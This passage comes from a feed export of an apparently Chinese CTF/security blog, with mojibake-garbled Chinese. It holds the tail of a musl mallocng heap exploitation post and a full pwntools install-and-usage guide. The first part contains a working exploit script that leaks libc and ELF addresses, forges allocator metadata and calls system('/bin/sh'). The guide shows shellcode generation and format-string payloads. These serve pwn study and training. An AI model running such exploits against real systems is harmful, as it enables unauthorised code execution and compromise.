class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">key=<span class="string">b&quot;hhhh&quot;</span>, size=<span class="number">4</span></span>):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">new_key = (<span class="built_in">int</span>((random.random()) * <span class="built_in">int</span>((<span class="string">b&quot;\xff&quot;</span> * size).<span class="built_in">hex</span>(), <span class="number">16</span>)) % <span class="built_in">int</span>((<span class="string">b&quot;\xff&quot;</span> * size).<span class="built_in">hex</span>(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">if</span> calc(key) == calc(new_key.to_bytes(size, <span class="string">&quot;little&quot;</span>)) :</span><br><span class="line"><span class="keyword">return</span> new_key.to_bytes(size, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        store(<span class="string">b&quot;victim&quot;</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        query(<span class="string">b&quot;h&quot;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_leak</span>():</span><br><span class="line">    info = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        info = p.recv(<span class="number">2</span>) + info</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(info, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- leak info --</span></span><br><span class="line">fengshui1(<span class="number">1</span>)</span><br><span class="line">fengshui2(<span class="number">5</span>) <span class="comment"># AFFFFFU</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak elf &amp; libc</span></span><br><span class="line">store(<span class="string">b&quot;hhhh&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x30</span>) <span class="comment"># [U]AAAA(U)U  [U] is KV, (U) is KV-&gt;value</span></span><br><span class="line">store(find_key(), <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">delete(<span class="string">b&quot;hhhh&quot;</span>) <span class="comment"># [F]AAAUFU</span></span><br><span class="line"></span><br><span class="line">fengshui2(<span class="number">3</span>) <span class="comment"># FFFFUFU</span></span><br><span class="line">store(<span class="string">b&quot;H\n&quot;</span>, <span class="string">b&quot;H&quot;</span>, <span class="number">0x1000</span>) <span class="comment"># AAAAU[U]U  [U] is the chunk we can get</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">addr_mmap = get_leak() - <span class="number">0x20</span></span><br><span class="line">addr_libc = addr_mmap + <span class="number">0x4000</span></span><br><span class="line">addr_malloc_context = addr_libc + <span class="number">0xad9c0</span></span><br><span class="line">addr_elf = get_leak() - <span class="number">0xc8d0</span></span><br><span class="line">addr_hhhh = addr_elf + <span class="number">0xc890</span></span><br><span class="line">addr_KV = addr_elf + <span class="number">0xcde0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># leak secret</span></span><br><span class="line">delete(<span class="string">b&quot;H&quot;</span>) <span class="comment"># AAAAUFU</span></span><br><span class="line">fengshui2(<span class="number">2</span>) <span class="comment"># AAFFUFU</span></span><br><span class="line">KV = p64(addr_hhhh) + p64(addr_malloc_context) + p64(<span class="number">4</span>) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x69052445</span>) + p64(<span class="number">0</span>)</span><br><span class="line">store(KV, <span class="string">b&quot;victim&quot;</span>) <span class="comment"># UUFFUFU</span></span><br><span class="line">query(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">secret = get_leak()</span><br><span class="line">get_leak()</span><br><span class="line">addr_heap = get_leak() - <span class="number">0x180</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;addr_elf: &quot;</span> + <span class="built_in">hex</span>(addr_elf))</span><br><span class="line">success(<span class="string">&quot;addr_mmap: &quot;</span> + <span class="built_in">hex</span>(addr_mmap))</span><br><span class="line">success(<span class="string">&quot;addr_libc: &quot;</span> + <span class="built_in">hex</span>(addr_libc))</span><br><span class="line">success(<span class="string">&quot;secret: &quot;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- construct --</span></span><br><span class="line"></span><br><span class="line">delete(KV) <span class="comment"># FFAAUFU</span></span><br><span class="line"></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">addr_ofl_head = addr_libc + <span class="number">0xafd48</span></span><br><span class="line">addr_fake_meta_area = addr_mmap + <span class="number">0x1000</span></span><br><span class="line">addr_fake_meta = addr_fake_meta_area + <span class="number">0x18</span></span><br><span class="line">addr_fake_group = addr_fake_meta + <span class="number">0x28</span></span><br><span class="line">addr_fake_chunk = addr_fake_group + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = p64(addr_fake_chunk) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(addr_ofl_head) <span class="comment"># next </span></span><br><span class="line">fake_meta += p64(addr_fake_group) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># avail &amp; freed mask</span></span><br><span class="line">fake_meta += p64(last_idx | freeable &lt;&lt; <span class="number">5</span> | sc &lt;&lt; <span class="number">6</span> | maplen &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">active_idx = <span class="number">0</span></span><br><span class="line">fake_group = p64(addr_fake_meta)</span><br><span class="line">fake_group += p64(active_idx)</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">fake_chunk += p64(addr_system) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_meta_area = <span class="string">b&quot;h&quot;</span> * <span class="number">0xfd0</span></span><br><span class="line">fake_meta_area += p64(secret) <span class="comment"># check</span></span><br><span class="line">fake_meta_area += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta_area += p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = fake_meta_area</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += fake_chunk</span><br><span class="line">payload += <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">store(payload, <span class="string">b&quot;victim&quot;</span>, <span class="number">0x1200</span>) <span class="comment"># FFAUUFU</span></span><br><span class="line">store(<span class="string">b&quot;victim&quot;</span>, <span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line">fengshui2(<span class="number">1</span>) <span class="comment"># AAUUUFU</span></span><br><span class="line">addr_hhhh = addr_hhhh + <span class="number">0xb0</span></span><br><span class="line">KV = p64(addr_hhhh) + p64(addr_fake_chunk) + p64(<span class="number">4</span>) + p64(<span class="number">0x80</span>) + p64(<span class="number">0x69052445</span>) + p64(<span class="number">0</span>)</span><br><span class="line">store(KV, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.xf1les.net/2021/11/03/mallocng-part-one/">musl libc å †ç®¡ç†å™¨ mallocng è¯¦è§£ (Part I)</a></p><p><a href="https://www.anquanke.com/post/id/253566">ä»musl libc 1.1.24åˆ°1.2.2 å­¦ä¹ pwnå§¿åŠ¿</a></p><p><a href="https://blog.csdn.net/easy_level1/article/details/118606424">[é˜…è¯»å‹]æ–°ç‰ˆmusl libc(1.2.2)å †ç®¡ç†ä¹‹æºç å‰–æï¼</a></p><p><a href="https://bbs.pediy.com/thread-269533-1.htm">[åŸåˆ›]musl 1.2.2 æ€»ç»“+æºç åˆ†æ One</a></p><p><a href="http://pzhxbz.cn/?p=172">æ–°ç‰ˆmusl libc æµ…æ</a></p><p><a href="http://blog.leanote.com/post/xp0int/2022-%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int">2022-å¼ºç½‘æ¯åˆèµ›-Writeup-By-Xp0int</a></p><p><a href="https://www.anquanke.com/post/id/241104">å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocng</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æµ…æµ…åˆ†æä¸€ä¸‹&lt;/p&gt;</summary>
    
    
    
    <category term="Computer Science" scheme="https://humoooor.cn/categories/Computer-Science/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
  </entry>
  
  <entry>
    <title>Pwntools çš„å®‰è£…åŠä½¿ç”¨</title>
    <link href="https://humoooor.cn/2022/02/05/Pwntools%20%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <id>https://humoooor.cn/2022/02/05/Pwntools%20%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/</id>
    <published>2022-02-05T11:03:00.000Z</published>
    <updated>2023-03-31T08:07:52.716Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹å®‰è£… pwntools çš„è¿‡ç¨‹å’ŒåŸºæœ¬ä½¿ç”¨</p><span id="more"></span><h2 id="Pwntools-å®‰è£…"><a href="#Pwntools-å®‰è£…" class="headerlink" title="Pwntools å®‰è£…"></a>Pwntools å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡ºç°ä¸‹é¢çš„ warning</p><blockquote><pre><code>WARNING: The scripts asm, checksec, common, constgrep, cyclic, debug, disablenx, disasm, elfdiff, elfpatch, errno, hex, main, phd, pwn, pwnstrip, scramble, shellcraft, template, unhex, update and version are installed in &#39;/home/yahu/.local/bin&#39; which is not on PATH.Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.</code></pre></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨ .bashrc æ–‡ä»¶æ·»åŠ </span></span><br><span class="line"><span class="built_in">export</span> PATH=~/.local/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># ç„¶å source ç›¸åº”çš„æ–‡ä»¶å³å¯</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ pwntools è‡ªå¸¦çš„å·¥å…·ï¼Œå¦‚ checksecã€cyclic ç­‰</p><h2 id="Pwntools-ä½¿ç”¨"><a href="#Pwntools-ä½¿ç”¨" class="headerlink" title="Pwntools ä½¿ç”¨"></a>Pwntools ä½¿ç”¨</h2><h3 id="å¸¸ç”¨å·¥å…·"><a href="#å¸¸ç”¨å·¥å…·" class="headerlink" title="å¸¸ç”¨å·¥å…·"></a>å¸¸ç”¨å·¥å…·</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>ç”¨äºæŸ¥çœ‹æ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶ã€æ¶æ„ä¿¡æ¯ç­‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h4 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h4><p>ç”¨äºéšæœºç”Ÿæˆä¸€ä¸²æœ‰åºå­—ç¬¦ä¸²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic 50</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨-python-æ¨¡å—"><a href="#å¸¸ç”¨-python-æ¨¡å—" class="headerlink" title="å¸¸ç”¨ python æ¨¡å—"></a>å¸¸ç”¨ python æ¨¡å—</h3><h4 id="ç¯å¢ƒè®¾ç½®"><a href="#ç¯å¢ƒè®¾ç½®" class="headerlink" title="ç¯å¢ƒè®¾ç½®"></a>ç¯å¢ƒè®¾ç½®</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½® ç³»ç»Ÿã€æ¶æ„ã€æ—¥å¿—è¾“å‡ºç­‰çº§</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386/amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="å¼•å…¥ç¨‹åº"><a href="#å¼•å…¥ç¨‹åº" class="headerlink" title="å¼•å…¥ç¨‹åº"></a>å¼•å…¥ç¨‹åº</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment"># è¿œç¨‹</span></span><br><span class="line">r = remote(<span class="string">&#x27;8.8.8.8&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="comment"># æœ¬åœ°</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"><span class="comment"># æœ€ç»ˆè¿›è¡Œäº¤äº’</span></span><br><span class="line">r.interactive()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="ELFæ–‡ä»¶"><a href="#ELFæ–‡ä»¶" class="headerlink" title="ELFæ–‡ä»¶"></a>ELFæ–‡ä»¶</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¼•å…¥ç¨‹åºæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ELF</span>(<span class="params">path : <span class="built_in">str</span></span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">    = p.elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å‡½æ•°åœ°å€</span></span><br><span class="line">addr_func = elf.sym[<span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"><span class="comment"># è·å–å‡½æ•° plt åœ°å€</span></span><br><span class="line">plt_func = elf.plt[<span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"><span class="comment"># è·å–å‡½æ•° got åœ°å€</span></span><br><span class="line">got_func = elf.got[<span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="number">134514548</span></span><br></pre></td></tr></table></figure><h4 id="å‘é€æ•°æ®"><a href="#å‘é€æ•°æ®" class="headerlink" title="å‘é€æ•°æ®"></a>å‘é€æ•°æ®</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">data : <span class="built_in">bytes</span></span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendafter</span>(<span class="params">delim : <span class="built_in">bytes</span>, data : <span class="built_in">bytes</span></span>)</span><br><span class="line">p.sendline(<span class="built_in">bytes</span>)</span><br><span class="line">p.sendlineafter(<span class="built_in">bytes</span>, <span class="built_in">bytes</span>)</span><br></pre></td></tr></table></figure><h4 id="æ¥å—æ•°æ®"><a href="#æ¥å—æ•°æ®" class="headerlink" title="æ¥å—æ•°æ®"></a>æ¥å—æ•°æ®</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recv()</span><br><span class="line">p.recv(<span class="built_in">int</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvuntil(<span class="built_in">bytes</span>)</span><br><span class="line">p.recvafter(<span class="built_in">bytes</span>)</span><br></pre></td></tr></table></figure><h4 id="æ•°æ®å¤„ç†"><a href="#æ•°æ®å¤„ç†" class="headerlink" title="æ•°æ®å¤„ç†"></a>æ•°æ®å¤„ç†</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†æ•°æ®æ‰“åŒ…æˆ n ä½çš„äºŒè¿›åˆ¶åŒ…</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p8</span>(<span class="params">number : <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span></span><br><span class="line">p16(<span class="built_in">bytes</span>)</span><br><span class="line">p32(<span class="built_in">bytes</span>)</span><br><span class="line">p64(<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">114514</span>)</span><br><span class="line"><span class="string">b&#x27;R\xbf\x01\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† n ä½çš„äºŒè¿›åˆ¶åŒ…è§£åŒ…æˆæ•°æ®</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u8</span>(<span class="params">number : <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span></span><br><span class="line">u16(<span class="built_in">int</span>)</span><br><span class="line">u32(<span class="built_in">int</span>)</span><br><span class="line">u64(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u32(<span class="string">b&#x27;R\xbf\x01\x00&#x27;</span>)</span><br><span class="line"><span class="number">114514</span></span><br></pre></td></tr></table></figure><h4 id="å…¶ä»–å¸¸ç”¨"><a href="#å…¶ä»–å¸¸ç”¨" class="headerlink" title="å…¶ä»–å¸¸ç”¨"></a>å…¶ä»–å¸¸ç”¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_payload</span>(<span class="params">offset : <span class="built_in">int</span> , writes : <span class="built_in">map</span></span>) -&gt; <span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åç§»ä¸º1ï¼Œå°†åœ°å€ä¸º2çš„å€¼ä¿®æ”¹æˆ3ï¼Œå°†åœ°å€ä¸º6çš„å€¼ä¿®æ”¹æˆ7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fmtstr_payload(<span class="number">1</span>, &#123;<span class="number">2</span> : <span class="number">3</span>, <span class="number">6</span> : <span class="number">7</span>&#125;)</span><br><span class="line"><span class="string">b&#x27;%3c%6$lln%4c%7$hhnaa\x02\x00\x00\x00\x06\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆ shellcode å­—ç¬¦ä¸²ï¼Œä¼šéšæ¶æ„è®¾ç½®è€Œç”Ÿæˆå¯¹åº”çš„ shellcode</span></span><br><span class="line">shellcraft.sh()</span><br><span class="line">shellcraft.i386.sh()</span><br><span class="line">shellcraft.amd64.sh()</span><br><span class="line">shellcraft.arm.sh()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†å­—ç¬¦ä¸²å½¢å¼çš„æ±‡ç¼–è½¬æˆæœºå™¨ç </span></span><br><span class="line">asm()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())</span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="ä¸€èˆ¬æµç¨‹"><a href="#ä¸€èˆ¬æµç¨‹" class="headerlink" title="ä¸€èˆ¬æµç¨‹"></a>ä¸€èˆ¬æµç¨‹</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;8.8.8.8&#x27;, 8888)</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•ä¸€ä¸‹å®‰è£… pwntools çš„è¿‡ç¨‹å’ŒåŸºæœ¬ä½¿ç”¨&lt;/p&gt;</summary>
    
    
    
    <category term="Tools" scheme="https://humoooor.cn/categories/Tools/"/>
    
    
    <category term="Pwn" scheme="https://humoooor.cn/tags/Pwn/"/>
    
  </entry>
  
</feed>
